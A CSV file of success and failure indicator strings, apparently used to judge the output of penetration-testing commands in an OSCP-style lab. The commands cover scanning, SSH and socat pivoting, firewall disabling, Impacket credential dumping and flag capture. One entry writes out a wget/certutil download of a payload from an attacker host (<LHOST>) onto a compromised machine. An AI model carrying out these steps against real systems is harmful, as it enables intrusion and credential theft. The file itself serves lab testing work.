"id","pattern","indicator_type"
"indicator_95","SMB SessionError","failure"
"indicator_96","Mount succeeds silently (no output)","success"
"indicator_97","ls <MOUNT_POINT> shows files","success"
"indicator_98","df -h shows mounted share","success"
"indicator_99","mount error(13): Permission denied","failure"
"indicator_100","mount error(2): No such file or directory","failure"
"indicator_101","mount error(6): No such device or address","failure"
"indicator_102","Host is down","failure"
"indicator_103","HTTP/1.1 200","success"
"indicator_104","Server:","success"
"indicator_105","X-Powered-By:","success"
"indicator_106","Content-Type:","success"
"indicator_107","Set-Cookie:","success"
"indicator_108","Could not resolve host","failure"
"indicator_109","Connection refused","failure"
"indicator_110","HTTP/1.1 404","failure"
"indicator_111","HTTP/1.1 403","failure"
"indicator_112","[200 OK]","success"
"indicator_113","Title","success"
"indicator_114","WordPress","success"
"indicator_115","Apache","success"
"indicator_116","PHP","success"
"indicator_117","jQuery","success"
"indicator_118","ERROR","failure"
"indicator_119","Timeout","failure"
"indicator_120","Connection refused","failure"
"indicator_121","[404 Not Found]","failure"
"indicator_122","Found:","success"
"indicator_123","Status: 200","success"
"indicator_124","[Status: 200]","success"
"indicator_125","Size:","success"
"indicator_126","No valid entries","failure"
"indicator_127","Error: the server returns a status code","failure"
"indicator_128","[-] Unable to connect","failure"
"indicator_129","context deadline exceeded","failure"
"indicator_130","; Transfer failed","success"
"indicator_131","IN","success"
"indicator_132","SOA","success"
"indicator_133","NS","success"
"indicator_134","A","success"
"indicator_135","MX","success"
"indicator_136","; Transfer failed.","failure"
"indicator_137","connection timed out","failure"
"indicator_138","XFR size: 0 records","failure"
"indicator_139","communications error","failure"
"indicator_140","Chain INPUT","success"
"indicator_141","Chain FORWARD","success"
"indicator_142","Chain OUTPUT","success"
"indicator_143","Permission denied","failure"
"indicator_144","command not found","failure"
"indicator_145","Rule added successfully","success"
"indicator_146","No error output","success"
"indicator_147","Permission denied","failure"
"indicator_148","Bad argument","failure"
"indicator_149","Rule added successfully","success"
"indicator_150","Permission denied","failure"
"indicator_151","Bad argument","failure"
"indicator_152","No error output","success"
"indicator_153","iptables -L shows empty chains","success"
"indicator_154","Permission denied","failure"
"indicator_155","Status: active","success"
"indicator_156","Status: inactive","success"
"indicator_157","command not found","failure"
"indicator_158","Rule added","success"
"indicator_159","Rule updated","success"
"indicator_160","Permission denied","failure"
"indicator_161","Firewall stopped and disabled","success"
"indicator_162","Permission denied","failure"
"indicator_163","public","success"
"indicator_164","target:","success"
"indicator_165","services:","success"
"indicator_166","command not found","failure"
"indicator_167","FirewallD is not running","failure"
"indicator_168","success","success"
"indicator_169","Error","failure"
"indicator_170","INVALID_PORT","failure"
"indicator_171","success","success"
"indicator_172","Domain Profile Settings","success"
"indicator_173","Private Profile Settings","success"
"indicator_174","Public Profile Settings","success"
"indicator_175","State","success"
"indicator_176","Access denied","failure"
"indicator_177","Firewall status","success"
"indicator_178","Operational mode","success"
"indicator_179","deprecated","failure"
"indicator_180","Access denied","failure"
"indicator_181","Ok.","success"
"indicator_182","Access denied","failure"
"indicator_183","already exists","failure"
"indicator_184","Ok.","success"
"indicator_185","Access denied","failure"
"indicator_186","Ok.","success"
"indicator_187","No error output","success"
"indicator_188","Access denied","failure"
"indicator_189","parameter is incorrect","failure"
"indicator_190","Listen on","success"
"indicator_191","Connect to","success"
"indicator_192","Access denied","failure"
"indicator_193","Ok.","success"
"indicator_194","Access denied","failure"
"indicator_195","Ok.","success"
"indicator_196","Deleted","success"
"indicator_197","No rules match","failure"
"indicator_198","Service starts silently (no output = success)","success"
"indicator_199","Verify with: sudo systemctl status ssh → Active: active (running)","success"
"indicator_200","Port listening: ss -ntplu | grep :22","success"
"indicator_201","Process running: ps aux | grep sshd","success"
"indicator_202","Failed to start ssh.service - SSH server not installed","failure"
"indicator_203","Job for ssh.service failed - port 22 already in use","failure"
"indicator_204","Address already in use - another SSH server running on port 22","failure"
"indicator_205","Service starts silently (no output = success)","success"
"indicator_206","Verify with: sudo systemctl status apache2 → Active: active (running)","success"
"indicator_207","Port listening: ss -ntplu | grep :80","success"
"indicator_208","Test from browser: http://localhost or curl http://localhost → Apache default page","success"
"indicator_209","File access from compromised host: wget http://<LHOST>/payload.exe or certutil -urlcache -f http://<LHOST>/winPEASx64.exe","success"
"indicator_210","Failed to start apache2.service - Apache not installed","failure"
"indicator_211","Address already in use - port 80 occupied by another service","failure"
"indicator_212","Job for apache2.service failed - check configuration errors","failure"
"indicator_213","Output shows listening ports with process names","success"
"indicator_214","SSH server: 0.0.0.0:22 users:((""sshd"",pid=1234,fd=3))","success"
"indicator_215","Apache server: 0.0.0.0:80 users:((""apache2"",pid=5678,fd=4))","success"
"indicator_216","Port forward: 127.0.0.1:9833 users:((""ssh"",pid=9999,fd=5))","success"
"indicator_217","Empty output - no listening services","failure"
"indicator_218","ss: command not found - iproute2 not installed (use netstat -ntplu alternative)","failure"
"indicator_219","Output shows interface names (eth0, tun0, wlan0)","success"
"indicator_220","Each interface lists IP addresses: inet <IP>/CIDR","success"
"indicator_221","VPN interface visible: tun0 or tap0 with OSCP lab IP (10.x.x.x)","success"
"indicator_222","Local interface: lo with 127.0.0.1/8","success"
"indicator_223","Ethernet/WiFi: eth0/wlan0 with LAN IP (192.168.x.x)","success"
"indicator_224","ip: command not found - iproute2 not installed (use ifconfig alternative)","failure"
"indicator_225","No VPN interface (tun0/tap0) - VPN not connected","failure"
"indicator_226","Output shows routing entries with destination networks","success"
"indicator_227","Default route: default via <gateway_ip> dev <interface>","success"
"indicator_228","VPN routes: 10.x.x.x/24 dev tun0 proto kernel scope link","success"
"indicator_229","Local network: 192.168.x.0/24 dev eth0 proto kernel scope link","success"
"indicator_230","Lab subnets: Multiple 10.x.x.0/24 entries for OSCP network segments","success"
"indicator_231","ip: command not found - iproute2 not installed","failure"
"indicator_232","No default route - no internet connectivity","failure"
"indicator_233","Missing tun0 routes - VPN not properly configured","failure"
"indicator_234","PORT STATE SERVICE","success"
"indicator_235","<PORT>/tcp open <service_name>","success"
"indicator_236","Nmap done: 1 IP address (1 host up) scanned","success"
"indicator_237","Service version detected if port open","success"
"indicator_238","<PORT>/tcp filtered <service> - firewall blocking","failure"
"indicator_239","<PORT>/tcp closed <service> - port not listening","failure"
"indicator_240","All 1 scanned ports are filtered - host may be down or firewall blocking","failure"
"indicator_241","Note: Host seems down - port unreachable despite -Pn","failure"
"indicator_242","psql prompt appears: postgres=#","success"
"indicator_243","Can execute queries: \l (list databases), \dt (list tables), SELECT * FROM users;","success"
"indicator_244","Version banner displayed: PostgreSQL <version> on <architecture>","success"
"indicator_245","No authentication errors","success"
"indicator_246","psql: error: connection to server failed: Connection refused - service not running or firewall blocking","failure"
"indicator_247","FATAL: password authentication failed for user - wrong credentials","failure"
"indicator_248","FATAL: database ""<name>"" does not exist - invalid database name","failure"
"indicator_249","psql: error: could not connect to server: No route to host - networking issue","failure"
"indicator_250","Sharename       Type      Comment","success"
"indicator_251","List of shares displayed (ADMIN$, C$, IPC$, custom shares)","success"
"indicator_252","IPC$ share present - indicates null session allowed","success"
"indicator_253","Readable shares listed - potential for anonymous access","success"
"indicator_254","NT_STATUS_ACCESS_DENIED - null sessions disabled (common on Windows 10/2019+)","failure"
"indicator_255","NT_STATUS_IO_TIMEOUT - SMB service not running or firewall blocking","failure"
"indicator_256","Connection to <TARGET> failed - host unreachable or wrong IP","failure"
"indicator_257","session setup failed: NT_STATUS_LOGON_FAILURE - null session not permitted","failure"
"indicator_258","Ok. message","success"
"indicator_259","netsh interface portproxy show all no longer lists rule","success"
"indicator_260","Access is denied - need administrator privileges","failure"
"indicator_261","Element not found - wrong listenport or listenaddress","failure"
"indicator_262","Full path displayed (e.g., C:\Windows\System32\OpenSSH\ssh.exe)","success"
"indicator_263","Multiple paths if executable in multiple locations","success"
"indicator_264","INFO: Could not find files for the given pattern(s) - executable not in PATH","failure"
"indicator_265","Host Name, OS Name, OS Version displayed","success"
"indicator_266","System Type (x64-based PC or x86-based PC)","success"
"indicator_267","Hotfix(s) list shows installed patches","success"
"indicator_268","Network Card(s) shows IP configuration","success"
"indicator_269","Privilege Name column lists available privileges","success"
"indicator_270","State shows Enabled or Disabled","success"
"indicator_271","SeDebugPrivilege, SeImpersonatePrivilege = high-value for privilege escalation","success"
"indicator_272","Multiple adapters listed (Ethernet, Ethernet 2, etc.)","success"
"indicator_273","IPv4 Address shows IP for each adapter","success"
"indicator_274","DNS Servers, Default Gateway displayed","success"
"indicator_275","Proto, Local Address, Foreign Address, State, PID columns displayed","success"
"indicator_276","LISTENING ports show bound services","success"
"indicator_277","ESTABLISHED connections show active communications","success"
"indicator_278","No output after password entry (normal with -N flag)","success"
"indicator_279","ss -ntplu shows listening port on specified address","success"
"indicator_280","Can connect to local port from client machine","success"
"indicator_281","Service accessible through tunnel (e.g., psql, smbclient works)","success"
"indicator_282","Connection refused - SSH server not reachable or port blocked","failure"
"indicator_283","Permission denied (publickey) - authentication failed, check credentials","failure"
"indicator_284","Address already in use - port conflict, choose different LOCAL_PORT","failure"
"indicator_285","Cannot assign requested address - BIND_ADDRESS not valid on this host","failure"
"indicator_286","No output after authentication with -N flag","success"
"indicator_287","ss -ntplu shows SOCKS port listening on specified address","success"
"indicator_288","Proxychains shows 'Strict chain ... SOCKS_PORT ... OK' when routing traffic","success"
"indicator_289","nmap/curl/smbclient work through proxychains","success"
"indicator_290","Connection refused - SSH server unreachable","failure"
"indicator_291","Permission denied - SSH authentication failed","failure"
"indicator_292","Proxychains shows 'socket error or timeout' - destination unreachable from pivot","failure"
"indicator_293","Proxychains shows 'DLL init' but no traffic - check /etc/proxychains4.conf configuration","failure"
"indicator_294","No output after authentication (normal with -N)","success"
"indicator_295","On SSH server: ss -ntplu shows listening port on bind address","success"
"indicator_296","Can connect to SSH_SERVER:REMOTE_PORT from attacker machine","success"
"indicator_297","Destination service accessible through reverse tunnel","success"
"indicator_298","Connection refused - SSH server not reachable from compromised client","failure"
"indicator_299","Permission denied - SSH authentication failed, check credentials","failure"
"indicator_300","bind: Cannot assign requested address - GatewayPorts disabled for 0.0.0.0 binding","failure"
"indicator_301","Address already in use - port conflict on SSH server","failure"
"indicator_302","No output after authentication (normal with -N)","success"
"indicator_303","On SSH server: ss shows SOCKS port on loopback (127.0.0.1 and [::1])","success"
"indicator_304","Proxychains shows 'OK' when routing traffic through local SOCKS port","success"
"indicator_305","Tools work through proxychains: nmap, curl, psql, smbclient","success"
"indicator_306","Connection refused - SSH server not reachable from client","failure"
"indicator_307","OpenSSH version too old - requires ≥7.6 (released October 2017)","failure"
"indicator_308","Permission denied - SSH authentication failed","failure"
"indicator_309","Proxychains socket error - check /etc/proxychains4.conf points to correct port","failure"
"indicator_310","Output shows 'listening on AF=2 0.0.0.0:<LOCAL_PORT>'","success"
"indicator_311","Output shows 'starting accept loop'","success"
"indicator_312","ss -ntplu shows Socat process listening on specified port","success"
"indicator_313","Client can connect to local port and access destination service","success"
"indicator_314","Address already in use - port conflict, choose different port","failure"
"indicator_315","Connection refused - destination unreachable or not listening","failure"
"indicator_316","Permission denied - trying to bind privileged port <1024 without root","failure"
"indicator_317","No output after command - Socat not installed or not in PATH","failure"
"indicator_318","Using username ""<username>""","success"
"indicator_319","Authenticating with password","success"
"indicator_320","Access granted","success"
"indicator_321","Remote port forwarding from 0.0.0.0:<REMOTE_PORT>","success"
"indicator_322","On SSH server: ss -ntplu shows port <REMOTE_PORT> listening","success"
"indicator_323","Connection timed out - SSH server unreachable from Windows client","failure"
"indicator_324","Access denied - wrong password or username","failure"
"indicator_325","Remote port forwarding failed - port already in use on SSH server","failure"
"indicator_326","Network error: Software caused connection abort - firewall blocking outbound SSH","failure"
"indicator_327","Loading rdp connection window","success"
"indicator_328","Windows login screen or desktop appears","success"
"indicator_329","Clipboard sharing functional (copy/paste works)","success"
"indicator_330","Shared drives visible in remote session","success"
"indicator_331","Connection failed - RDP service not running or firewall blocking","failure"
"indicator_332","Authentication failure - wrong credentials","failure"
"indicator_333","Certificate verification failed - use /cert-ignore flag","failure"
"indicator_334","CredSSP encryption error - downgrade CredSSP with /sec:rdp or update system","failure"
"indicator_335","OpenSSH version displayed (e.g., OpenSSH_8.2p1)","success"
"indicator_336","Version ≥7.6 required for remote dynamic forwarding (-R port only)","success"
"indicator_337","Version ≥7.4 required for ProxyJump support","success"
"indicator_338","Command not found - SSH client not installed","failure"
"indicator_339","debug1: Authentication succeeded","success"
"indicator_340","debug1: Entering interactive session","success"
"indicator_341","debug1: Local forwarding listening on...","success"
"indicator_342","debug1: Remote forwarding listening on...","success"
"indicator_343","debug1: Connection closed by remote host","failure"
"indicator_344","debug1: No more authentication methods to try","failure"
"indicator_345","debug1: connect_to <dest> port <port>: failed","failure"
"indicator_346","Connected to server","success"
"indicator_347","c : Connected","success"
"indicator_348","Direct access to internal IPs without proxychains","success"
"indicator_349","ip route shows new routes through tun0 interface","success"
"indicator_350","NAT traversal failed - check firewall rules","failure"
"indicator_351","Permission denied - SSH authentication failed","failure"
"indicator_352","Fatal: server died - Python not available on pivot host","failure"
"indicator_353","Password prompt appears","success"
"indicator_354","Login successful","success"
"indicator_355","Shell prompt from target system","success"
"indicator_356","Last login information displayed","success"
"indicator_357","Connection refused (port 22 closed)","failure"
"indicator_358","Connection timed out (firewall blocking)","failure"
"indicator_359","Permission denied (wrong password/username)","failure"
"indicator_360","Host key verification failed","failure"
"indicator_361","Login successful without password prompt","success"
"indicator_362","Shell prompt from target system","success"
"indicator_363","Last login information displayed","success"
"indicator_364","No 'WARNING: UNPROTECTED PRIVATE KEY FILE' error","success"
"indicator_365","WARNING: UNPROTECTED PRIVATE KEY FILE (permissions too open)","failure"
"indicator_366","Permission denied (publickey) - key not authorized","failure"
"indicator_367","Load key: invalid format - key file corrupted or wrong format","failure"
"indicator_368","Enter passphrase for key - key is encrypted with passphrase","failure"
"indicator_369","-----BEGIN RSA PRIVATE KEY----- header visible","success"
"indicator_370","-----BEGIN OPENSSH PRIVATE KEY----- header visible","success"
"indicator_371","Base64-encoded key material displayed","success"
"indicator_372","-----END RSA PRIVATE KEY----- footer visible","success"
"indicator_373","No such file or directory (key doesn't exist)","failure"
"indicator_374","Permission denied (can't read key)","failure"
"indicator_375","Empty file (key deleted or corrupted)","failure"
"indicator_376","Proc-Type: 4,ENCRYPTED (passphrase protected)","failure"
"indicator_377","Your identification has been saved with the new passphrase","success"
"indicator_378","Key format converted successfully","success"
"indicator_379","File header changes to -----BEGIN RSA PRIVATE KEY-----","success"
"indicator_380","Key now works with ssh -i","success"
"indicator_381","Load key: invalid format","failure"
"indicator_382","Failed to load key","failure"
"indicator_383","Permissions 0644 too open (fix with chmod 600)","failure"
"indicator_384","File not found","failure"
"indicator_385","Line added to /etc/proxychains4.conf under [ProxyList] section","success"
"indicator_386","proxychains shows 'Strict chain ... <SOCKS_PORT> ... OK' when testing","success"
"indicator_387","Tools work through proxychains: proxychains curl http://internal-ip","success"
"indicator_388","Permission denied - need sudo to edit /etc/proxychains4.conf","failure"
"indicator_389","proxychains shows 'socket error' - wrong IP/port or SOCKS tunnel not running","failure"
"indicator_390","DLL init but no traffic - configuration syntax error","failure"
"indicator_391","proxychains shows 'OK' for each connection attempt","success"
"indicator_392","Nmap displays open ports on internal target","success"
"indicator_393","Scan completes without 'socket error' messages","success"
"indicator_394","Services detected on internal network IPs","success"
"indicator_395","proxychains socket error - SOCKS proxy not running or misconfigured","failure"
"indicator_396","All ports show as filtered - routing issue or target firewall","failure"
"indicator_397","Very slow scan (>5 min for 20 ports) - timeout values too high in proxychains4.conf","failure"
"indicator_398","DLL init but no results - static nmap binary incompatible with LD_PRELOAD","failure"
"indicator_399","proxychains shows 'OK' for connection","success"
"indicator_400","psql prompt appears: dbname=>","success"
"indicator_401","\l command lists databases","success"
"indicator_402","SELECT queries return results","success"
"indicator_403","proxychains socket error - SOCKS proxy not running","failure"
"indicator_404","psql: connection refused - PostgreSQL not listening or firewall blocking","failure"
"indicator_405","psql: authentication failed - wrong username/password","failure"
"indicator_406","timeout waiting for connection - routing issue through pivot","failure"
"indicator_407","Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation'","success"
"indicator_408","For DCSync: '[*] Using the DRSUAPI method to get NTDS.DIT secrets'","success"
"indicator_409","For SAM: '[*] Dumping local SAM hashes'","success"
"indicator_410","Credential lines: 'domain\user:RID:LMhash:NThash:::' format","success"
"indicator_411","NTLM hash format: 32 hexadecimal characters (e.g., 2892d26cdf84d7a70e2eb3b9f05c425e)","success"
"indicator_412","Kerberos keys listed (if using -just-dc): aes256-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96","success"
"indicator_413","Output: '[*] Cleaning up...' indicates successful completion","success"
"indicator_414","ERROR: [-] RemoteOperations failed: DCERPC Runtime Error - Insufficient permissions (not Domain/Local Admin)","failure"
"indicator_415","ERROR: [-] SMB SessionError: STATUS_LOGON_FAILURE - Wrong credentials","failure"
"indicator_416","ERROR: [-] [Errno Connection error] Connection timed out - Target unreachable or firewall blocking","failure"
"indicator_417","ERROR: [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN - Authenticating user doesn't exist","failure"
"indicator_418","ERROR: [-] User '<user>' not found - Target username not found (DCSync with -just-dc-user)","failure"
"indicator_419","SERVICE_NAME:","success"
"indicator_420","BINARY_PATH_NAME:","success"
"indicator_421","SERVICE_START_NAME:","success"
"indicator_422","Nmap version","success"
"indicator_423","Platform:","success"
"indicator_424","cap_setuid","success"
"indicator_425","cap_net_raw","success"
"indicator_426","cap_dac_override","success"
"indicator_427","has no capability","failure"
"indicator_428","CN=Users","success"
"indicator_429","CN=Groups","success"
"indicator_430","OU=Domain","success"
"indicator_431","description","success"
"indicator_432","info","success"
"indicator_433","comment","success"
"indicator_434","PowerView.ps1","success"
"indicator_435","version","success"
"indicator_436","No modules match","failure"
"indicator_437","Cannot find path","failure"
"indicator_438","ActiveDirectoryRights","success"
"indicator_439","ExtendedRight","success"
"indicator_440","SecurityIdentifier","success"
"indicator_441","ActiveDirectoryRights","success"
"indicator_442","ObjectType","success"
"indicator_443","InheritedObjectType","success"
"indicator_444","User-agent:","success"
"indicator_445","Disallow:","success"
"indicator_446","Allow:","success"
"indicator_447","404 Not Found","failure"
"indicator_448","403 Forbidden","failure"
"indicator_449","200 OK responses without blocking","success"
"indicator_450","No 429 status codes","success"
"indicator_451","429 Too Many Requests","failure"
"indicator_452","Account locked","failure"
"indicator_453","IP banned","failure"
"indicator_454","File contents displayed","success"
"indicator_455","Text visible in terminal","success"
"indicator_456","No such file or directory","failure"
"indicator_457","Permission denied","failure"
"indicator_458","Is a directory","failure"
"indicator_459","pwd shows new directory","success"
"indicator_460","Prompt updates with new path","success"
"indicator_461","No such file or directory","failure"
"indicator_462","Permission denied","failure"
"indicator_463","Not a directory","failure"
"indicator_464","File renamed successfully","success"
"indicator_465","ls shows new filename","success"
"indicator_466","No such file or directory","failure"
"indicator_467","Permission denied","failure"
"indicator_468","File exists (target already present)","failure"
"indicator_469","Entry added to /etc/hosts","success"
"indicator_470","hostname resolves to IP (ping <HOSTNAME>)","success"
"indicator_471","Browser can access http://<HOSTNAME>","success"
"indicator_472","Permission denied (missing sudo)","failure"
"indicator_473","sudo: command not found","failure"
"indicator_474","32-character hexadecimal string displayed","success"
"indicator_475","Flag format matches (e.g., abc123def456...)","success"
"indicator_476","No such file or directory (wrong user/path)","failure"
"indicator_477","Permission denied (insufficient privileges)","failure"
"indicator_478","32-character hexadecimal string displayed","success"
"indicator_479","Root flag captured","success"
"indicator_480","No such file or directory","failure"
"indicator_481","Permission denied (not root)","failure"
"indicator_482","listfile option documentation displayed","success"
"indicator_483","Usage information shown","success"
"indicator_484","7z: command not found","failure"
"indicator_485","No matches found","failure"
"indicator_486","Readable strings extracted","success"
"indicator_487","Credentials found","success"
"indicator_488","Functionality identified","success"
"indicator_489","File not found","failure"
"indicator_490","Permission denied","failure"
"indicator_491","Binary stripped (no strings)","failure"
"indicator_492","Program executes with root privileges","success"
"indicator_493","Menu or options displayed","success"
"indicator_494","Permission denied","failure"
"indicator_495","Command not found","failure"
"indicator_496","sudo: unable to execute","failure"
"indicator_497","File contents displayed in console output","success"
"indicator_498","For text files: readable content, proper line breaks","success"
"indicator_499","For flags: hash format (MD5: 32 hex chars, SHA1: 40 hex chars) or custom format","success"
"indicator_500","Exit code 0 (check: echo %errorlevel%)","success"
"indicator_501","Can copy output successfully for documentation","success"
"indicator_502","Error: 'The system cannot find the file specified' - wrong path or file doesn't exist","failure"
"indicator_503","Error: 'Access is denied' - insufficient read permissions","failure"
"indicator_504","Error: 'file is being used by another process' - file locked by application","failure"
"indicator_505","Garbage output for binary files (.exe, .dll, .zip) - not a text file","failure"
"indicator_506","Blank output when file should have content - encoding issue or empty file","failure"
"indicator_507","File contents displayed line-by-line in console","success"
"indicator_508","For text files: proper encoding, readable content","success"
"indicator_509","Array of strings returned (can pipe to Where-Object, Select-String)","success"
"indicator_510","No error messages","success"
"indicator_511","Output can be assigned to variable: $content = Get-Content file.txt","success"
"indicator_512","Error: 'Cannot find path' - file doesn't exist or wrong path","failure"
"indicator_513","Error: 'Access to the path is denied' - insufficient permissions","failure"
"indicator_514","Error: 'The process cannot access the file' - file locked","failure"
"indicator_515","Garbage characters - wrong encoding","failure"
"indicator_516","Empty output when file has content - encoding mismatch","failure"
"indicator_517","bytes from","success"
"indicator_518","time=","success"
"indicator_519","100% packet loss","failure"
"indicator_520","Destination Host Unreachable","failure"
"indicator_521","open|filtered - port may be open (UDP doesn't guarantee response)","success"
"indicator_522","open - definitive open port (rare, requires specific response)","success"
"indicator_523","closed - ICMP port unreachable received","failure"
"indicator_524","filtered - firewall blocking probes","failure"
"indicator_525","Exit code 0","success"
"indicator_526","No output (silent success)","success"
"indicator_527","Exit code 1 (file not found or invalid hash format)","failure"
"indicator_528","grep returns no matches","failure"
"indicator_529","Path to crackmapexec binary (e.g., /usr/bin/crackmapexec)","success"
"indicator_530","Exit code 0","success"
"indicator_531","No output","failure"
"indicator_532","Exit code 1 (command not found)","failure"
"indicator_533","Output: active","success"
"indicator_534","Neo4j is running","success"
"indicator_535","Exit code 0","success"
"indicator_536","Output: inactive","failure"
"indicator_537","Neo4j is not running","failure"
"indicator_538","Exit code 1","failure"
"indicator_539","HTTP/1.1 200 OK","success"
"indicator_540","HTTP/1.1 30x (redirects)","success"
"indicator_541","Server header present","success"
"indicator_542","Exit code 0","success"
"indicator_543","Connection refused","failure"
"indicator_544","Timeout after 5 seconds","failure"
"indicator_545","Could not resolve host","failure"
"indicator_546","Exit code 7 (connection failed)","failure"
"indicator_547","Output: Get-NetDomain","success"
"indicator_548","Exit code 0","success"
"indicator_549","No output","failure"
"indicator_550","Command not found","failure"
"indicator_551","Exit code 1","failure"
"indicator_552","Path to secretsdump.py","success"
"indicator_553","Path to psexec.py","success"
"indicator_554","Path to GetNPUsers.py","success"
"indicator_555","Exit code 0","success"
"indicator_556","Command not found","failure"
"indicator_557","Exit code 1","failure"
"indicator_558","Path to evil-winrm binary","success"
"indicator_559","Exit code 0","success"
"indicator_560","Command not found","failure"
"indicator_561","Exit code 1","failure"
"indicator_562","Path to nmap binary (e.g., /usr/bin/nmap)","success"
"indicator_563","Exit code 0","success"
"indicator_564","Command not found","failure"
"indicator_565","Exit code 1","failure"
"indicator_566","Exit code 0 (file exists)","success"
"indicator_567","No output","success"
"indicator_568","Exit code 1 (file not found)","failure"
"indicator_569","Exit code 0 (file exists)","success"
"indicator_570","No output","success"
"indicator_571","Exit code 1 (file not found)","failure"
"indicator_572","Path to getcap binary","success"
"indicator_573","Exit code 0","success"
"indicator_574","Command not found","failure"
"indicator_575","Exit code 1","failure"
"indicator_576","alpine image listed in docker images","success"
"indicator_577","Pull successful: Downloaded newer image","success"
"indicator_578","Exit code 0","success"
"indicator_579","Cannot connect to Docker daemon","failure"
"indicator_580","Permission denied","failure"
"indicator_581","Exit code 1","failure"
"indicator_582","Path to curl or wget binary","success"
"indicator_583","Exit code 0","success"
"indicator_584","Neither curl nor wget found","failure"
"indicator_585","Exit code 1","failure"
"indicator_586","Path to socat binary","success"
"indicator_587","Exit code 0","success"
"indicator_588","Command not found","failure"
"indicator_589","Exit code 1","failure"
